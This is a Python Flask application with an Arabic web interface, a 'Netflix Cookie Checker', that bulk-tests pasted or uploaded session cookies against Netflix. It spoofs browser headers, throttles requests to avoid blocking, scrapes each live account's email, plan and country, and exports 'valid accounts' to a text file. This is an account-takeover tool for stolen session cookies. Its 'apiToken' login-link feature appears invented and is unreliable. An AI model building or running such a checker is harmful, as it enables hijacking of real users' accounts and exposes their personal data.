from flask import Flask, render_template_string, request, jsonify
import requests, re, json, base64, os, time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

app = Flask(__name__)

HTML = r'''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Cookie Checker Pro</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
    <style>
        :root {
            --bg:#0f0f0f; --card:#1e1e1e; --input:#252525; --red:#e50914;
            --green:#2ecc71; --yellow:#f39c12; --blue:#3498db; --white:#fff;
            --text2:#b3b3b3; --border:#333; --radius:14px;
        }
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:'Cairo',sans-serif; background:var(--bg); color:var(--white); padding:20px; }
        .container { max-width:1100px; margin:auto; }
        .logo { text-align:center; font-size:3.5em; font-weight:900; color:var(--red); letter-spacing:6px; margin-bottom:10px; }
        h1 { text-align:center; background:linear-gradient(135deg,var(--red),#f40612); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
        .sub { color:var(--text2); text-align:center; margin-bottom:20px; }
        .stats { display:grid; grid-template-columns:repeat(auto-fit,minmax(130px,1fr)); gap:12px; margin:20px 0; }
        .stat { background:var(--card); border:1px solid var(--border); border-radius:var(--radius); padding:15px; text-align:center; }
        .stat-icon { font-size:2em; }
        .stat-val { font-size:2em; font-weight:900; }
        .stat-label { color:var(--text2); font-size:0.8em; }
        .section { background:var(--card); border:1px solid var(--border); border-radius:var(--radius); padding:20px; margin:20px 0; }
        .two-cols { display:grid; grid-template-columns:1fr 1fr; gap:20px; }
        @media (max-width:768px) { .two-cols { grid-template-columns:1fr; } }
        .upload-area {
            border:2px dashed var(--border); border-radius:var(--radius); padding:30px 20px;
            text-align:center; background:var(--input); cursor:pointer; transition:all 0.3s;
            min-height:180px; display:flex; flex-direction:column; justify-content:center; align-items:center;
        }
        .upload-area:hover, .upload-area.dragover { border-color:var(--red); background:rgba(229,9,20,0.05); }
        textarea {
            width:100%; height:180px; background:var(--input); border:1px solid var(--border);
            border-radius:var(--radius); color:var(--white); padding:15px; font-family:monospace;
            direction:ltr; resize:vertical;
        }
        textarea:focus { outline:none; border-color:var(--red); }
        .btn {
            padding:12px 25px; border:none; border-radius:8px; font-weight:700; cursor:pointer;
            color:var(--white); font-family:'Cairo'; transition:all 0.3s; font-size:0.95em;
            display:inline-flex; align-items:center; gap:6px;
        }
        .btn-primary { background:var(--red); }
        .btn-success { background:var(--green); }
        .btn-warning { background:#e67e22; }
        .btn-danger { background:#c0392b; }
        .btn-outline { background:transparent; border:2px solid var(--red); color:var(--red); }
        .btn-outline:hover { background:var(--red); color:var(--white); }
        .btn:disabled { opacity:0.5; cursor:not-allowed; }
        .progress { display:none; margin:15px 0; }
        .progress-bar { height:8px; background:var(--input); border-radius:4px; overflow:hidden; }
        .progress-fill { height:100%; background:var(--red); width:0%; transition:width 0.3s; }
        .progress-text { text-align:center; color:var(--text2); margin-top:5px; }
        .filter-bar { display:flex; gap:8px; flex-wrap:wrap; margin:15px 0; }
        .filter-btn { padding:6px 15px; border:1px solid var(--border); border-radius:20px; background:transparent; color:var(--text2); cursor:pointer; font-size:0.8em; }
        .filter-btn.active, .filter-btn:hover { background:var(--red); color:var(--white); border-color:var(--red); }
        .result-card { background:var(--card); border:1px solid var(--border); border-radius:var(--radius); margin-bottom:12px; overflow:hidden; }
        .result-header { padding:15px; display:flex; justify-content:space-between; align-items:center; cursor:pointer; }
        .badge { padding:5px 12px; border-radius:20px; font-size:0.8em; font-weight:700; }
        .badge-valid { background:rgba(46,204,113,0.15); color:var(--green); }
        .badge-invalid { background:rgba(229,9,20,0.15); color:var(--red); }
        .badge-error { background:rgba(243,156,18,0.15); color:var(--yellow); }
        .result-body { display:none; padding:0 15px 15px; }
        .result-body.show { display:block; }
        .cookie-box { background:var(--input); padding:10px; border-radius:6px; font-family:monospace; direction:ltr; word-break:break-all; margin:8px 0; }
        .detail-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(140px,1fr)); gap:8px; margin:10px 0; }
        .detail-item { background:var(--input); padding:10px; border-radius:6px; text-align:center; }
        .detail-label { color:var(--text2); font-size:0.75em; }
        .detail-value { font-weight:700; }
        .token-section { background:var(--input); border-radius:8px; padding:12px; margin-top:10px; }
        .links-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(180px,1fr)); gap:8px; margin-top:10px; }
        .link-card { background:var(--card); border:1px solid var(--border); border-radius:8px; padding:10px; text-align:center; }
        .link-icon { font-size:1.8em; }
        .copy-btn, .open-btn { padding:5px 12px; border:none; border-radius:6px; cursor:pointer; font-weight:600; margin:3px; font-family:'Cairo'; }
        .copy-btn { background:var(--green); color:var(--white); }
        .open-btn { background:var(--red); color:var(--white); }
        .toast { position:fixed; top:20px; left:50%; transform:translateX(-50%); padding:12px 30px; border-radius:8px; color:var(--white); font-weight:700; z-index:9999; }
        .toast-success { background:var(--green); }
        .toast-error { background:var(--red); }
        .toast-info { background:var(--blue); }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">NETFLIX</div>
        <h1>🔍 فاحص الكوكيز المتكامل</h1>
        <div class="sub">ارفع ملفات ZIP أو الصق الكوكيز يدوياً</div>

        <div class="stats">
            <div class="stat"><div class="stat-icon">📝</div><div class="stat-val" id="statTotal" style="color:var(--blue)">0</div><div class="stat-label">الإجمالي</div></div>
            <div class="stat"><div class="stat-icon">✅</div><div class="stat-val" id="statValid" style="color:var(--green)">0</div><div class="stat-label">صالحة</div></div>
            <div class="stat"><div class="stat-icon">❌</div><div class="stat-val" id="statInvalid" style="color:var(--red)">0</div><div class="stat-label">غير صالحة</div></div>
            <div class="stat"><div class="stat-icon">⚠️</div><div class="stat-val" id="statErrors" style="color:var(--yellow)">0</div><div class="stat-label">أخطاء</div></div>
            <div class="stat"><div class="stat-icon">⚡</div><div class="stat-val" id="statSpeed">0s</div><div class="stat-label">الوقت</div></div>
        </div>

        <div class="section">
            <div class="two-cols">
                <!-- عمود رفع الملفات -->
                <div>
                    <div style="font-weight:700; margin-bottom:10px;">📁 رفع ملفات ZIP / TXT</div>
                    <div class="upload-area" id="uploadArea">
                        <div style="font-size:2.5em">📤</div>
                        <div>اسحب وأفلت الملفات هنا</div>
                        <div style="color:var(--text2); font-size:0.8em;">يتم استخراج الكوكيز تلقائياً</div>
                    </div>
                    <input type="file" id="fileInput" accept=".zip,.txt,.csv" multiple style="display:none">
                </div>
                <!-- عمود لصق الكوكيز -->
                <div>
                    <div style="font-weight:700; margin-bottom:10px;">📋 لصق الكوكيز يدوياً</div>
                    <textarea id="cookieTextarea" placeholder="الصق الكوكيز هنا...\nكل كوكيز في سطر منفصل"></textarea>
                </div>
            </div>
            <div style="text-align:center; margin-top:15px; display:flex; gap:10px; justify-content:center; flex-wrap:wrap;">
                <button class="btn btn-primary" id="btnCheck" onclick="startCheck()">🚀 ابدأ الفحص</button>
                <button class="btn btn-danger" id="btnStop" onclick="stopCheck()" style="display:none;">⏹️ إيقاف الفحص</button>
                <button class="btn btn-success" id="btnDownloadValid" disabled onclick="downloadValid()">💾 تحميل الحسابات الصالحة</button>
                <button class="btn btn-warning" onclick="clearAll()">🗑️ مسح الكل</button>
            </div>
            <div class="progress" id="progressContainer">
                <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
                <div class="progress-text" id="progressText"></div>
            </div>
        </div>

        <div class="filter-bar">
            <button class="filter-btn active" onclick="setFilter('all')">الكل</button>
            <button class="filter-btn" onclick="setFilter('valid')">✅ صالحة</button>
            <button class="filter-btn" onclick="setFilter('invalid')">❌ غير صالحة</button>
            <button class="filter-btn" onclick="setFilter('error')">⚠️ أخطاء</button>
        </div>
        <div id="resultsList"></div>
    </div>

    <script>
        let allCookies = [];            // {cookie, source}
        let allResults = [];
        let currentFilter = 'all';
        let abortController = null;     // للإيقاف
        let isChecking = false;

        const uploadArea = document.getElementById('uploadArea');
        const fileInput = document.getElementById('fileInput');
        const cookieTextarea = document.getElementById('cookieTextarea');
        const btnCheck = document.getElementById('btnCheck');
        const btnStop = document.getElementById('btnStop');
        const btnDownloadValid = document.getElementById('btnDownloadValid');

        // --- Upload handling ---
        uploadArea.addEventListener('click', ()=> fileInput.click());
        uploadArea.addEventListener('dragover', e=> { e.preventDefault(); uploadArea.classList.add('dragover'); });
        uploadArea.addEventListener('dragleave', ()=> uploadArea.classList.remove('dragover'));
        uploadArea.addEventListener('drop', e=> {
            e.preventDefault();
            uploadArea.classList.remove('dragover');
            handleFiles(e.dataTransfer.files);
        });
        fileInput.addEventListener('change', e=> handleFiles(e.target.files));

        async function handleFiles(files) {
            let count = 0;
            for (let file of files) {
                if (file.name.endsWith('.zip')) {
                    try {
                        const zip = await JSZip.loadAsync(file);
                        for (let [filename, zipEntry] of Object.entries(zip.files)) {
                            if (!zipEntry.dir && (filename.endsWith('.txt') || filename.endsWith('.csv'))) {
                                const content = await zipEntry.async('string');
                                const lines = content.split('\n').map(l=>l.trim()).filter(l=> l && l.includes('='));
                                lines.forEach(c => allCookies.push({ cookie: c, source: filename }));
                                count += lines.length;
                            }
                        }
                    } catch (err) {
                        showToast(`❌ خطأ في قراءة ZIP: ${err.message}`, 'error');
                    }
                } else if (file.name.endsWith('.txt') || file.name.endsWith('.csv')) {
                    const content = await file.text();
                    const lines = content.split('\n').map(l=>l.trim()).filter(l=> l && l.includes('='));
                    lines.forEach(c => allCookies.push({ cookie: c, source: file.name }));
                    count += lines.length;
                }
            }
            if (count > 0) {
                showToast(`✅ تم تحميل ${count} كوكيز من الملفات`, 'success');
            }
        }

        // --- جمع الكوكيز من كلا المصدرين ---
        function collectAllCookies() {
            const manualText = cookieTextarea.value.trim();
            const manualCookies = manualText ? manualText.split('\n').map(l=>l.trim()).filter(l=> l && l.includes('=')) : [];
            const fileCookies = allCookies.map(c => c.cookie);
            // دمج مع إزالة التكرارات
            const all = [...new Set([...fileCookies, ...manualCookies])];
            return all.map(c => ({ cookie: c, source: 'manual' }));
        }

        // --- Start / Stop ---
        async function startCheck() {
            const cookies = collectAllCookies();
            if (cookies.length === 0) {
                showToast('❌ لا توجد كوكيز لفحصها. ارفع ملفات أو الصق كوكيز.', 'error');
                return;
            }

            if (isChecking) return;
            isChecking = true;
            abortController = new AbortController();
            const signal = abortController.signal;

            btnCheck.style.display = 'none';
            btnStop.style.display = 'inline-flex';
            document.getElementById('progressContainer').style.display = 'block';
            document.getElementById('resultsList').innerHTML = '';
            allResults = [];
            const startTime = Date.now();
            const total = cookies.length;
            let processed = 0;
            const batchSize = 20;

            for (let i = 0; i < total; i += batchSize) {
                if (signal.aborted) break;

                const batch = cookies.slice(i, i+batchSize).map(c => c.cookie).join('\n');
                try {
                    const resp = await fetch('/check_multiple', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({cookies: batch}),
                        signal: signal
                    });
                    const data = await resp.json();
                    if (data.results) {
                        data.results.forEach((r, idx) => {
                            r.sourceFile = 'manual';
                        });
                        allResults.push(...data.results);
                    }
                } catch(e) {
                    if (e.name === 'AbortError') break;
                    for (let j = i; j < Math.min(i+batchSize, total); j++) {
                        allResults.push({
                            status:'error', message:'فشل الاتصال',
                            cookie: cookies[j].cookie,
                            sourceFile: 'manual',
                            timestamp: new Date().toLocaleString()
                        });
                    }
                }
                processed = Math.min(i+batchSize, total);
                const pct = Math.round(processed/total*100);
                document.getElementById('progressFill').style.width = pct+'%';
                document.getElementById('progressText').textContent = `فحص ${processed}/${total}`;
                renderResults();
                updateStats();
            }

            document.getElementById('statSpeed').textContent = ((Date.now()-startTime)/1000).toFixed(2)+'s';
            document.getElementById('progressContainer').style.display = 'none';
            btnCheck.style.display = 'inline-flex';
            btnStop.style.display = 'none';
            btnDownloadValid.disabled = (allResults.filter(r=>r.status==='valid').length === 0);
            isChecking = false;
            updateStats();
            renderResults();
            showToast(signal.aborted ? '⏹️ تم إيقاف الفحص' : `✅ تم فحص ${total} كوكيز`, signal.aborted ? 'info' : 'success');
        }

        function stopCheck() {
            if (abortController) {
                abortController.abort();
            }
        }

        // --- Render results (same as before) ---
        function renderResults() {
            const container = document.getElementById('resultsList');
            let filtered = currentFilter==='all' ? allResults : allResults.filter(r=> r.status===currentFilter);
            if (filtered.length === 0) {
                container.innerHTML = '<div style="text-align:center;color:var(--text2);padding:30px;">لا توجد نتائج</div>';
                return;
            }
            const statusText = {valid:'✅ صالحة', invalid:'❌ غير صالحة', error:'⚠️ خطأ'};
            container.innerHTML = filtered.map((r, idx) => {
                const cls = 'badge-' + (r.status||'unknown');
                const rid = 'res-'+idx+'-'+Date.now();
                let details = '';
                if (r.details) {
                    details = '<div class="detail-grid">';
                    for (let [k,v] of Object.entries({membership:'📋 العضوية', plan:'💎 الباقة', country:'🌍 البلد', email:'📧 البريد'}))
                        if (r.details[k] && r.details[k]!=='غير معروف') details += `<div class="detail-item"><div class="detail-label">${v}</div><div class="detail-value">${r.details[k]}</div></div>`;
                    details += '</div>';
                }
                const cookieText = r.cookie || '';
                return `
                <div class="result-card">
                    <div class="result-header" onclick="this.nextElementSibling.classList.toggle('show')">
                        <div style="display:flex; align-items:center; gap:10px; flex-wrap:wrap;">
                            <span class="badge ${cls}">${statusText[r.status]||'❓'}</span>
                            <span style="color:var(--text2);">#${idx+1}</span>
                            <span>${r.message||''}</span>
                        </div>
                        <span>▼</span>
                    </div>
                    <div class="result-body">
                        ${details}
                        <div style="margin:8px 0;"><strong>🔒 الكوكيز:</strong>
                            <div class="cookie-box">${escapeHtml(cookieText)}</div>
                            <button class="copy-btn" onclick="copyText('${escapeQuotes(cookieText)}')">📋 نسخ الكوكيز</button>
                        </div>
                        ${r.api_tokens?.api_token ? `
                        <div class="token-section">
                            <strong>🔑 ApiToken</strong>
                            <div style="background:#000;color:var(--green);padding:8px;border-radius:6px;font-family:monospace;word-break:break-all;margin:8px 0;">${r.api_tokens.api_token}</div>
                            <button class="copy-btn" onclick="copyText('${escapeQuotes(r.api_tokens.api_token)}')">📋 نسخ ApiToken</button>
                            <div class="links-grid">
                                ${r.api_tokens.direct_links ? Object.entries(r.api_tokens.direct_links).map(([k,d]) => `
                                    <div class="link-card">
                                        <div class="link-icon">${d.name.split(' ')[0]}</div>
                                        <div style="font-weight:700;">${d.name}</div>
                                        <div style="margin:5px 0;">
                                            <button class="open-btn" onclick="window.open('${d.url}')">🔗 فتح</button>
                                            <button class="copy-btn" onclick="copyText('${escapeQuotes(d.url)}')">📋 نسخ</button>
                                        </div>
                                    </div>
                                `).join('') : ''}
                            </div>
                        </div>` : ''}
                        <div style="color:var(--text2); font-size:0.8em; margin-top:8px;">${r.timestamp||''}</div>
                    </div>
                </div>`;
            }).join('');
        }

        function escapeHtml(text) {
            return text.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
        }
        function escapeQuotes(text) {
            return text.replace(/'/g,"\\'").replace(/"/g,'&quot;');
        }

        function setFilter(f) {
            currentFilter = f;
            document.querySelectorAll('.filter-btn').forEach(b=>b.classList.remove('active'));
            event.target.classList.add('active');
            renderResults();
        }

        function updateStats() {
            document.getElementById('statTotal').textContent = allResults.length;
            document.getElementById('statValid').textContent = allResults.filter(r=>r.status==='valid').length;
            document.getElementById('statInvalid').textContent = allResults.filter(r=>r.status==='invalid').length;
            document.getElementById('statErrors').textContent = allResults.filter(r=>r.status==='error').length;
        }

        function downloadValid() {
            const valid = allResults.filter(r=> r.status==='valid');
            if (!valid.length) return showToast('لا حسابات صالحة', 'error');
            let txt = '═══ حسابات Netflix الصالحة ═══\n\n';
            valid.forEach((r,i) => {
                txt += `[${i+1}]\n`;
                txt += `الكوكيز: ${r.cookie||'(غير متوفر)'}\n`;
                if (r.details) {
                    txt += `البريد: ${r.details.email||'?'}\n`;
                    txt += `العضوية: ${r.details.membership||'?'}\n`;
                    txt += `الباقة: ${r.details.plan||'?'}\n`;
                    txt += `البلد: ${r.details.country||'?'}\n`;
                }
                if (r.api_tokens?.api_token) {
                    txt += `ApiToken: ${r.api_tokens.api_token}\n`;
                }
                if (r.api_tokens?.direct_links) {
                    txt += `رابط الكمبيوتر: ${r.api_tokens.direct_links.computer?.url||''}\n`;
                    txt += `رابط الجوال: ${r.api_tokens.direct_links.mobile?.url||''}\n`;
                    txt += `رابط التلفاز: ${r.api_tokens.direct_links.tv?.url||''}\n`;
                }
                txt += '─'.repeat(50) + '\n';
            });
            const blob = new Blob(['\uFEFF'+txt], {type:'text/plain;charset=utf-8'});
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = 'netflix_valid_accounts.txt';
            a.click();
            showToast('💾 تم تحميل الحسابات الصالحة', 'success');
        }

        function copyText(text) { navigator.clipboard.writeText(text).then(()=> showToast('✅ تم النسخ','success')).catch(()=> showToast('❌ فشل','error')); }
        function showToast(msg, type) {
            const t = document.createElement('div');
            t.className = `toast toast-${type}`;
            t.textContent = msg;
            document.body.appendChild(t);
            setTimeout(()=> t.remove(), 2500);
        }
        function clearAll() {
            allCookies = [];
            allResults = [];
            cookieTextarea.value = '';
            document.getElementById('resultsList').innerHTML = '';
            btnDownloadValid.disabled = true;
            updateStats();
            document.getElementById('statSpeed').textContent = '0s';
            showToast('🗑️ تم مسح الكل', 'info');
        }
    </script>
</body>
</html>
'''

# --- Backend with improved headers and delay ---
def check_cookie(cookie):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cookie': cookie,
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
        }
        
        session = requests.Session()
        r = session.get(
            'https://www.netflix.com/YourAccount',
            headers=headers,
            timeout=15,
            allow_redirects=False
        )
        
        result = {
            'status':'unknown','message':'','details':{},'api_tokens':{},
            'cookie': cookie,
            'timestamp':datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        
        if r.status_code == 200:
            if 'membershipStatus' in r.text:
                mm = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', r.text)
                pm = re.search(r'"planName"\s*:\s*"([^"]+)"', r.text)
                cm = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', r.text)
                em = re.search(r'"email"\s*:\s*"([^"]+)"', r.text)
                result['status'] = 'valid'
                result['message'] = '✅ كوكيز صالحة والحساب نشط'
                result['details'] = {
                    'membership': mm.group(1) if mm else 'غير معروف',
                    'plan': pm.group(1) if pm else 'غير معروف',
                    'country': cm.group(1) if cm else 'غير معروف',
                    'email': em.group(1) if em else 'غير معروف'
                }
                nid = sid = None
                for p in cookie.split(';'):
                    p = p.strip()
                    if p.startswith('NetflixId='): nid = p.split('=',1)[1]
                    elif p.startswith('SecureNetflixId='): sid = p.split('=',1)[1]
                if nid and sid:
                    payload = {'netflixId':nid,'secureNetflixId':sid,'timestamp':datetime.now().isoformat()}
                    token = base64.b64encode(json.dumps(payload).encode()).decode().replace('+','-').replace('/','_').replace('=','')
                    result['api_tokens'] = {
                        'api_token': token,
                        'direct_links': {
                            'computer': {'name':'💻 كمبيوتر','url':f'https://www.netflix.com/Login?apiToken={token}'},
                            'mobile': {'name':'📱 جوال','url':f'https://www.netflix.com/Login?apiToken={token}&deviceType=mobile'},
                            'tv': {'name':'📺 تلفاز','url':f'https://www.netflix.com/tv/login?apiToken={token}'}
                        }
                    }
            else:
                result['status'] = 'valid'
                result['message'] = '✅ كوكيز صالحة (تم تسجيل الدخول)'
        elif r.status_code == 302:
            result['status'] = 'invalid'
            result['message'] = '❌ منتهية الصلاحية'
        elif r.status_code == 403:
            result['status'] = 'invalid'
            result['message'] = '🚫 تم حظر الطلب'
        else:
            result['status'] = 'error'
            result['message'] = f'⚠️ رمز الحالة: {r.status_code}'
        return result
    except Exception as e:
        return {'status':'error','message':str(e),'cookie':cookie,'timestamp':datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

@app.route('/')
def home():
    return render_template_string(HTML)

@app.route('/check_multiple', methods=['POST'])
def check_multiple():
    data = request.get_json()
    cookies = data.get('cookies','')
    if not cookies: return jsonify({'status':'error'})
    lines = [c.strip() for c in cookies.split('\n') if c.strip() and '=' in c]
    results = []
    # استخدام عدد أقل من العمال لتجنب الحظر (5 بدلاً من 10)
    with ThreadPoolExecutor(max_workers=5) as ex:
        futs = {ex.submit(check_cookie, c):i for i,c in enumerate(lines,1)}
        for f in as_completed(futs):
            try:
                res = f.result()
                res['index'] = futs[f]
                results.append(res)
            except: pass
    results.sort(key=lambda x: x.get('index',0))
    # تأخير بسيط بين الدفعات (يتم التعامل معه في الجافاسكريبت)
    return jsonify({'results':results})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT',5000)))
